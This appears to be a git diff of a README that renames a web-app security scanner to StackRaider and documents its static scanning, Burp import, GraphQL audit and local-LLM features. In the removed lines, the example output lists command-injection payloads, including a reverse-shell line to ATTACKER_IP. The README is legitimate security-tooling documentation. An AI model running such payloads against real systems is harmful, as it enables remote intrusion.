@@ -1,354 +1,355 @@
-# 🔒 Web Application Security Scanner
+<div align="center">
 
-Offline static analysis tool for identifying security vulnerabilities in **JavaScript**, **TypeScript**, **PHP**, and **Python** web applications. Includes exploitation guidance and built-in cheatsheets for penetration testing.
+<pre>
+ ▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄                ▄▄             
+█████▀▀▀  ██              ▄▄     ███▀▀███▄       ▀▀     ██             
+ ▀████▄  ▀██▀▀ ▀▀█▄ ▄████ ██ ▄█▀ ███▄▄███▀  ▀▀█▄ ██  ▄████ ▄█▀█▄ ████▄ 
+   ▀████  ██  ▄█▀██ ██    ████   ███▀▀██▄  ▄█▀██ ██  ██ ██ ██▄█▀ ██ ▀▀ 
+███████▀  ██  ▀█▄██ ▀████ ██ ▀█▄ ███  ▀███ ▀█▄██ ██▄ ▀████ ▀█▄▄▄ ██    
 
-## Features
+╔══════════════════════════════════════════════════════════════════╗
+║  ▸ code scan   ▸ burp traffic   ▸ graphql audit   ▸ local llm   ║
+║              ▼  raid the full application stack  ▼              ║
+╚══════════════════════════════════════════════════════════════════╝
+</pre>
 
-- **🔍 120+ Security Rules**: Covers OWASP Top 10 and common vulnerability patterns
-- **🌐 Multi-Language Support**: JavaScript, TypeScript, PHP, Python (Flask/Django)
-- **⚡ Fast Scanning**: Multi-threaded file scanning with regex-based pattern matching
-- **📊 Multiple Report Formats**: Terminal, JSON, CSV, and interactive HTML reports
-- **⚔️ Exploitation Guidance**: Step-by-step exploitation instructions for each vulnerability
-- **📋 Built-in Cheatsheets**: Quick reference for SSTI, SQLi, CMDi, LFI, SSRF, XSS, JWT, Deserialization
-- **🔎 Custom Pattern Search**: Grep-like search for custom patterns across codebase
-- **🛡️ Remediation Advice**: Clear guidance on how to fix each issue
-- **🔌 Offline Operation**: Works completely offline - no internet required
-- **🎯 CWE Mapping**: All findings mapped to Common Weakness Enumeration IDs
+**Raid the full application stack — source, traffic, and GraphQL — with offline static analysis and local LLM triage.**
+
+[![Python 3.11+](https://img.shields.io/badge/python-3.11+-3776ab?style=flat-square&logo=python&logoColor=white)](https://www.python.org/)
+[![License: MIT](https://img.shields.io/badge/license-MIT-22c55e?style=flat-square)](LICENSE)
+[![Offline](https://img.shields.io/badge/cloud-none-6366f1?style=flat-square)]()
+[![Ollama](https://img.shields.io/badge/LLM-Ollama%20(local)-000?style=flat-square&logo=ollama)](https://ollama.com/)
+
+[Quick Start](#-quick-start) · [Web UI](#-web-ui) · [CLI Reference](#-cli-reference) · [API](#-api) · [Rules](#-vulnerability-coverage)
+
+</div>
+
+---
+
+## What is StackRaider?
+
+StackRaider merges **static code scanning**, **Burp Suite traffic cross-reference**, **GraphQL schema auditing**, and **local LLM analysis** into one offline pentest workflow. No SaaS, no API keys — everything runs on your machine.
+
+```mermaid
+flowchart LR
+  subgraph inputs [Evidence]
+    Code[Source code]
+    Burp[Burp XML / HAR]
+    GQL[Introspection JSON]
+  end
+
+  subgraph engine [StackRaider]
+    Scan[135+ static rules]
+    Routes[Route discovery]
+    Schema[GraphQL auditor]
+    LLM[Ollama analysis]
+  end
+
+  subgraph outputs [Deliverables]
+    Reports[JSON / CSV / HTML]
+    Queries[Exploit GraphQL queries]
+    Paths[LLM attack paths]
+  end
+
+  Code --> Scan
+  Code --> Routes
+  Burp --> LLM
+  Scan --> LLM
+  GQL --> Schema
+  Schema --> Queries
+  Scan --> Reports
+  LLM --> Paths
+```
+
+| Module | What it does |
+|--------|----------------|
+| **Code scan** | Regex-based static analysis across JS/TS, PHP, Python with route-aware findings |
+| **Burp import** | Parse `.xml`, `.har`, or `.burp` exports; match live traffic to discovered routes |
+| **GraphQL audit** | Parse introspection JSON → static rules → auto-generated test queries → optional LLM pass |
+| **LLM triage** | Local Ollama correlates code findings, Burp requests, and schema data into attack paths |
+
+---
 
 ## Quick Start
 
+### 1. Install
+
 ```bash
-# Basic scan
-python scanner.py /path/to/project
+git clone https://github.com/yourusername/srcsniff.git
+cd srcsniff
 
-# Scan with vendor/third-party directories (for full app analysis)
-python scanner.py . --include-vendor
-
-# Quick overview (brief mode)
-python scanner.py . --brief --severity HIGH
-
-# Search for custom patterns
-python scanner.py . --grep "password|secret|api_key"
-
-# Show SSTI exploitation cheatsheet
-python scanner.py --cheatsheet ssti
+python -m venv .venv && source .venv/bin/activate
+pip install -r requirements.txt
+pip install -e .          # installs the `stackraider` CLI
 ```
 
-## Vulnerability Categories
+### 2. Scan (CLI)
 
-### JavaScript/TypeScript (52 rules)
+```bash
+stackraider scan /path/to/project
+stackraider scan . --severity HIGH --html report.html
+```
+
+### 3. Web UI (recommended)
+
+```bash
+cd frontend && npm install && npm run build && cd ..
+stackraider web --port 8001
+```
+
+Open **http://127.0.0.1:8001** — Code scan, Burp import, GraphQL analysis, and LLM chat in one interface.
+
+> **Tip:** If the browser won't connect, disable Burp/Firefox proxy for `127.0.0.1`.
+
+### 4. GraphQL (headless)
+
+```bash
+stackraider graphql --file introspection.json
+stackraider graphql --file introspection.json --llm --model llama3.2
+```
+
+---
+
+## Web UI
+
+The unified interface is organized into three sections. Session state persists across tabs — scan results, Burp traffic, and GraphQL findings survive navigation.
+
+| Section | Routes | Purpose |
+|---------|--------|---------|
+| **Code** | `/code/scan` · `/code/results` · `/code/burp` · `/code/analysis` | Static scan, traffic import, LLM attack-path analysis |
+| **GraphQL** | `/graphql` · `/graphql/schema` · `/graphql/findings` · `/graphql/queries` | Introspection audit, schema explorer, exploit queries |
+| **Shared** | `/models` · `/settings` | Pull/manage Ollama models, configure host & defaults |
+| **Correlate** | `/code/correlation` | Link code `GQL-*` rule hits ↔ live schema findings; export session JSON |
+
+---
+
+## CLI Reference
+
+```bash
+stackraider scan <path> [options]     # Static security scan
+stackraider web [path] [--port N]     # Launch unified web UI
+stackraider graphql --file <json>     # Headless GraphQL audit
+```
+
+### Scan highlights
+
+```bash
+# Severity filter
+stackraider scan . --severity HIGH
+
+# Custom grep across codebase
+stackraider scan . --grep "password|secret|api_key"
+
+# Pentest exports
+stackraider scan . --burp sitemap.xml --urls urls.txt --csv findings.csv
+
+# Exploitation cheatsheets (SSTI, SQLi, XSS, JWT, …)
+stackraider scan --cheatsheet list
+stackraider scan --cheatsheet xss
+
+# Attack surface map (on by default when routes found)
+stackraider scan . --no-attack-surface
+
+# Diff against previous JSON scan
+stackraider scan . --baseline previous.json
+```
+
+### Legacy entry point
+
+`python scanner.py` still works but prints a deprecation warning — prefer `stackraider scan`.
+
+---
+
+## API
+
+Namespaced REST + SSE + WebSocket endpoints served by the unified FastAPI backend.
+
+| Prefix | Examples |
+|--------|----------|
+| `/api/code/*` | `POST /api/code/scan` · `POST /api/code/analyze` · `POST /api/code/burp/upload` |
+| `/api/graphql/*` | `POST /api/graphql/analyze` (SSE stream) · `GET /api/graphql/state` |
+| `/api/session` | Unified session summary + cross-module correlations |
+| `/api/export` | Full session bundle (scan + burp + graphql + analyses) |
+| `/api/models/*` | List, pull, and delete Ollama models |
+| `/api/chat` | WebSocket schema-aware LLM chat |
+
+Legacy aliases (`/api/scan`, `/api/analyze`, …) remain for backward compatibility.
+
+---
+
+## Configuration
+
+| Variable | Default | Description |
+|----------|---------|-------------|
+| `STACKRAIDER_OLLAMA_HOST` | `http://localhost:11434` | Ollama API endpoint |
+| `STACKRAIDER_DEFAULT_MODEL` | `llama3.2` | Default model for analysis & chat |
+
+Requires [Ollama](https://ollama.com/download) running locally for LLM features (`ollama serve`).
+
+---
+
+## Vulnerability Coverage
+
+**135+ rules** across four language stacks, mapped to CWE IDs with built-in exploitation guidance.
+
+<details>
+<summary><strong>JavaScript / TypeScript</strong> — 52 rules</summary>
 
 | Category | Examples |
 |----------|----------|
-| **Command Injection** | exec(), eval(), child_process |
-| **SQL Injection** | String concatenation in queries |
-| **NoSQL Injection** | MongoDB operator injection |
-| **XSS** | innerHTML, dangerouslySetInnerHTML |
-| **Path Traversal** | File operations with user input |
-| **SSRF** | HTTP requests with user-controlled URLs |
-| **Authentication** | Hardcoded credentials, JWT issues |
-| **Privilege Escalation** | Backdoor URL params, insecure string matching |
-| **Information Disclosure** | AWS keys, API tokens, private keys |
-| **Prototype Pollution** | Object.assign, deep merge |
-| **Insecure Deserialization** | node-serialize vulnerabilities |
-| **CORS Misconfiguration** | Allow-Origin: * |
-| **Weak Cryptography** | MD5, SHA1, hardcoded keys |
+| Command Injection | `exec()`, `eval()`, `child_process` |
+| SQL / NoSQL Injection | String-built queries, Mongo operators |
+| XSS | `innerHTML`, `dangerouslySetInnerHTML` |
+| SSRF / Path Traversal | User-controlled URLs and file paths |
+| Auth & Secrets | Hardcoded credentials, JWT misconfig |
+| Prototype Pollution | `Object.assign`, deep merge sinks |
+| Deserialization | `node-serialize`, unsafe `JSON.parse` flows |
+| CORS / Crypto | `Access-Control-Allow-Origin: *`, MD5/SHA1 |
 
-### PHP (40 rules)
+</details>
+
+<details>
+<summary><strong>PHP</strong> — 40 rules</summary>
 
 | Category | Examples |
 |----------|----------|
-| **Command Injection** | system(), exec(), passthru(), backticks |
-| **Code Injection** | eval(), preg_replace /e, create_function() |
-| **SQL Injection** | mysqli_query, PDO without prepared statements |
-| **File Inclusion** | include(), require() with user input (LFI/RFI) |
-| **Path Traversal** | file_get_contents(), fopen() with user paths |
-| **File Upload** | Unrestricted move_uploaded_file() |
-| **XSS** | echo/print with unsanitized $_GET/$_POST |
-| **Insecure Deserialization** | unserialize() with user input |
-| **SSTI** | Twig/Blade template injection |
-| **Host Header Injection** | HTTP_X_FORWARDED_HOST without validation |
-| **SSRF** | file_get_contents(), curl with user URLs |
-| **XXE** | simplexml_load_string, DOMDocument |
-| **LDAP Injection** | ldap_search with user input |
-| **Type Juggling** | Weak comparison (==) for auth |
-| **Session Fixation** | Missing session_regenerate_id() |
+| Command / Code Injection | `system()`, `eval()`, `preg_replace /e` |
+| SQL Injection | `mysqli_query`, unprepared PDO |
+| LFI / RFI | `include()`, `require()` with user input |
+| XSS / SSTI | Unsanitized `echo`, Twig/Blade injection |
+| SSRF / XXE | `file_get_contents()`, `simplexml_load_string` |
+| File Upload | Unrestricted `move_uploaded_file()` |
+| Session / Auth | Fixation, type juggling (`==`) |
 
-### Python (28 rules)
+</details>
+
+<details>
+<summary><strong>Python</strong> — 28 rules</summary>
 
 | Category | Examples |
 |----------|----------|
-| **Command Injection** | os.system(), subprocess with shell=True |
-| **Code Injection** | eval(), exec() with user input |
-| **SQL Injection** | cursor.execute() with string formatting |
-| **SSTI** | render_template_string() with user input |
-| **Flask Debug Mode** | app.run(debug=True) - Werkzeug RCE |
-| **Path Traversal** | open(), send_file() with user paths |
-| **Insecure Deserialization** | pickle.loads(), yaml.load() |
-| **SSRF** | requests.get() with user URLs |
-| **XXE** | etree.parse(), xml.dom |
-| **Weak Cryptography** | md5/sha1 for passwords, random module |
-| **Hardcoded Secrets** | SECRET_KEY, passwords in code |
-| **JWT Vulnerabilities** | verify=False, none algorithm |
+| Command Injection | `os.system()`, `subprocess` with `shell=True` |
+| SQL Injection | `cursor.execute()` with f-strings |
+| SSTI | `render_template_string()` |
+| Flask Debug | `app.run(debug=True)` — Werkzeug RCE |
+| Deserialization | `pickle.loads()`, `yaml.load()` |
+| SSRF / XXE | `requests.get()`, `etree.parse()` |
+| Secrets / JWT | Hardcoded `SECRET_KEY`, `verify=False` |
 
-## Installation
+</details>
 
-```bash
-# Clone the repository
-git clone https://github.com/yourusername/code-scanner.git
-cd code-scanner
+<details>
+<summary><strong>GraphQL (code + schema)</strong></summary>
 
-# No additional dependencies required (uses Python standard library)
-# Python 3.7+ required
+- **In source:** `rules_graphql.py` flags introspection enabled, missing auth, dangerous resolvers
+- **In schema:** StackRaider audits live introspection for IDOR chains, DoS nesting, sensitive fields, and generates replay-ready test queries
 
-# Make executable
-chmod +x scanner.py
-```
+</details>
 
-## Usage
+### File types scanned
 
-### Basic Scan
+| Language | Extensions |
+|----------|------------|
+| JavaScript / TypeScript | `.js` `.ts` `.tsx` `.jsx` `.mjs` `.cjs` |
+| PHP | `.php` `.phtml` `.inc` … |
+| Python | `.py` `.pyw` |
 
-```bash
-# Scan a directory
-python scanner.py /path/to/your/project
+Excluded by default: `node_modules/`, `vendor/`, `.git/`, `dist/`, `build/`, `*.min.js` — use `--include-vendor` for full-app audits.
 
-# Scan current directory
-python scanner.py .
+---
 
-# Scan a single file
-python scanner.py /path/to/file.js
-
-# Include vendor/third-party directories (OSCP: scan everything!)
-python scanner.py . --include-vendor
-```
-
-### Filter by Severity
+## Output & Reports
 
 ```bash
-# Only show HIGH and CRITICAL findings
-python scanner.py . --severity HIGH
-
-# Show all findings including INFO
-python scanner.py . --severity INFO
+stackraider scan . --brief                          # One-liner triage
+stackraider scan . --output report.json             # Machine-readable
+stackraider scan . --csv findings.csv --html report.html
+stackraider scan . --secrets                        # Copy-paste secrets inventory
+stackraider scan . --no-exploitation                # Findings only, no payloads
+stackraider scan . --verbose                        # Include remediation text
 ```
 
-### Output Modes
+### Example (brief mode)
 
-```bash
-# Brief mode - compact output for quick triage
-python scanner.py . --brief
-
-# Full output with exploitation guidance (default)
-python scanner.py .
-
-# Verbose mode (includes remediation)
-python scanner.py . --verbose
-
-# Hide exploitation guidance
-python scanner.py . --no-exploitation
-```
-
-### Export Reports
-
-```bash
-# Export to JSON
-python scanner.py . --output report.json
-
-# Export to CSV (for notes/spreadsheets)
-python scanner.py . --csv findings.csv
-
-# Export to interactive HTML
-python scanner.py . --html report.html
-
-# All formats at once
-python scanner.py . --output report.json --csv findings.csv --html report.html
-```
-
-### Exploitation Cheatsheets
-
-Quick reference for common exploitation techniques:
-
-```bash
-# List available cheatsheets
-python scanner.py --cheatsheet list
-
-# Show specific cheatsheet
-python scanner.py --cheatsheet ssti    # Server-Side Template Injection
-python scanner.py --cheatsheet sqli    # SQL Injection
-python scanner.py --cheatsheet cmdi    # Command Injection
-python scanner.py --cheatsheet lfi     # Local File Inclusion
-python scanner.py --cheatsheet ssrf    # Server-Side Request Forgery
-python scanner.py --cheatsheet xss     # Cross-Site Scripting
-python scanner.py --cheatsheet jwt     # JWT Token Attacks
-python scanner.py --cheatsheet deser   # Deserialization
-```
-
-### Custom Pattern Search (Grep Mode)
-
-Search for custom patterns across the codebase:
-
-```bash
-# Search for potential secrets
-python scanner.py . --grep "password|secret|api_key|token"
-
-# Search for interesting functions
-python scanner.py . --grep "eval|exec|system|shell"
-
-# Search for comments with security implications
-python scanner.py . --grep "TODO|FIXME|XXX|HACK|BUG"
-
-# Include vendor directories in search
-python scanner.py . --grep "admin" --include-vendor
-```
-
-### Advanced Options
-
-```bash
-# Exclude specific rules
-python scanner.py . --exclude-rules CMD-001,SQL-001
-
-# Increase parallel workers
-python scanner.py . --workers 8
-
-# Auto-unminify minified JS files before scanning
-python scanner.py . --unminify
-
-# Disable colors (for piping)
-python scanner.py . --no-color > results.txt
-
-# List all available rules
-python scanner.py --list-rules
-```
-
-## JavaScript Unminifier
-
-The scanner includes a standalone unminifier module for beautifying minified JavaScript before security analysis.
-
-```bash
-# Unminify a single file
-python unminify.py bundle.min.js
-
-# Specify output file
-python unminify.py bundle.min.js -o readable.js
-
-# Auto-unminify during scan
-python scanner.py . --unminify
-```
-
-## Example Output
-
-### Brief Mode
 ```
 /app/api/utils.js:45:CRITICAL:Command Injection via child_process.exec
 /app/auth/login.js:23:HIGH:Hardcoded Password
 /app/db/query.js:67:CRITICAL:SQL Injection via String Concatenation
 ```
 
-### Full Mode
-```
-═══════════════════════════════════════════════════════════════════════
-📊 SCAN SUMMARY
-═══════════════════════════════════════════════════════════════════════
+---
 
-  Target:         /home/user/webapp
-  Files Scanned:  156
-  Duration:       2.34 seconds
-  Rules Loaded:   120 rules across 34 categories
-  Total Findings: 12
+## JavaScript Unminifier
 
-  Findings by Severity:
-    ● CRITICAL: 2
-    ● HIGH: 5
-    ● MEDIUM: 4
-    ● LOW: 1
-
-═══════════════════════════════════════════════════════════════════════
-🚨 VULNERABILITY FINDINGS
-═══════════════════════════════════════════════════════════════════════
-
-[1] Command Injection via child_process.exec
-    Severity: CRITICAL | Category: Command Injection | CWE-78
-    📁 /home/user/webapp/api/utils.js:45
-
-    Code Context:
-      const filename = req.query.file;
-    ➤ exec(`convert ${filename} output.png`);
-      res.send('Done');
-
-    ⚔️  EXPLOITATION GUIDANCE:
-    ╔════════════════════════════════════════════════════════════════╗
-    ║  COMMAND INJECTION                                             ║
-    ╚════════════════════════════════════════════════════════════════╝
-
-    PAYLOADS:
-    ; id
-    | id
-    `id`
-    $(id)
-    ; bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
-    ...
-```
-
-## File Types Scanned
-
-| Language | Extensions |
-|----------|------------|
-| JavaScript/TypeScript | `.js`, `.ts`, `.tsx`, `.jsx`, `.mjs`, `.cjs` |
-| PHP | `.php`, `.phtml`, `.php3`, `.php4`, `.php5`, `.php7`, `.phps`, `.inc` |
-| Python | `.py`, `.pyw` |
-
-## Directories Excluded
-
-By default, the scanner excludes:
-- `node_modules/`, `vendor/` (use `--include-vendor` to scan)
-- `.git/`, `dist/`, `build/`, `.next/`, `coverage/`
-- Minified files (`*.min.js`)
-
-## OSCP Tips
-
-For OSCP and CTF challenges:
-
-1. **Always use `--include-vendor`** - vulnerabilities are often in third-party code
-2. **Use `--brief` for quick triage** - identify targets fast
-3. **Export to CSV** - keep notes organized
-4. **Use `--grep` for secrets** - find hardcoded credentials
-5. **Check cheatsheets** - `--cheatsheet ssti` etc. for quick payloads
+Beautify minified bundles before scanning:
 
 ```bash
-# Full OSCP scan workflow
-python scanner.py /target --include-vendor --severity MEDIUM --csv notes.csv
-python scanner.py /target --grep "password|secret|key|token" --include-vendor
-python scanner.py --cheatsheet ssti  # When you find template injection
+python unminify.py bundle.min.js -o readable.js
+stackraider scan . --unminify
 ```
+
+---
+
+## Pentest Workflow Tips
+
+```bash
+# Full assessment pipeline
+stackraider scan /target --include-vendor --severity MEDIUM --csv notes.csv
+stackraider scan /target --grep "password|secret|key|token" --include-vendor
+stackraider web /target                              # Import Burp + run LLM analysis
+
+# When you hit a specific vuln class
+stackraider scan --cheatsheet ssti
+stackraider scan --cheatsheet sqli
+```
+
+1. Scan with `--include-vendor` — vulns often live in dependencies  
+2. Use `--brief` for fast triage, then drill into HIGH+  
+3. Import Burp history in the web UI to ground LLM analysis in live traffic  
+4. Paste GraphQL introspection to cross-check code `GQL-*` findings  
+5. Export the session bundle from **Correlate** for your report  
+
+---
+
+## Project Structure
+
+```
+stackraider/
+├── cli.py                 # stackraider scan | web | graphql
+├── core/                  # Scanner engine + rules
+├── graphql/               # Schema parser, static analyzer, query generator
+└── web/                   # FastAPI server, Burp parser, LLM layer, static UI
+
+frontend/                  # React + TypeScript + Tailwind (Vite)
+scanner.py                 # Deprecated shim → use stackraider CLI
+```
+
+---
 
 ## Ethical Use
 
-⚠️ **This tool is intended for ethical penetration testing only.**
+This tool is for **authorized security testing only**.
 
-- Only scan code you have permission to test
-- Use findings responsibly to improve security
-- Do not use exploitation guidance against systems without authorization
-- Report vulnerabilities responsibly to affected parties
+- Only scan code and systems you have permission to test  
+- Use exploitation guidance to verify and remediate — not to attack  
+- Report findings responsibly  
+
+---
 
 ## Contributing
 
-Contributions are welcome! To add new rules:
+New rules belong in `stackraider/core/rules*.py`:
 
-1. Add your rule to `rules.py`, `rules_php.py`, or `rules_python.py`
-2. Include comprehensive exploitation guidance
-3. Map to appropriate CWE ID
-4. Test against sample vulnerable code
+1. Add a `SecurityRule` with regex, severity, CWE, exploitation text  
+2. Test against `test_samples/`  
+3. Keep exploitation guidance actionable (payloads, curl, context)  
+
+---
 
 ## License
 
-MIT License - See LICENSE file for details.
+MIT — see [LICENSE](LICENSE).
 
 ## Acknowledgments
 
-Rules inspired by:
-- [Semgrep Security Rules](https://semgrep.dev/docs/)
-- [OWASP Top 10](https://owasp.org/Top10/)
-- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
-- [HackTricks](https://book.hacktricks.xyz/)
-- [CWE Database](https://cwe.mitre.org/)
+Rule patterns and guidance informed by [Semgrep](https://semgrep.dev/), [OWASP Top 10](https://owasp.org/Top10/), [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings), [HackTricks](https://book.hacktricks.xyz/), and the [CWE database](https://cwe.mitre.org/).
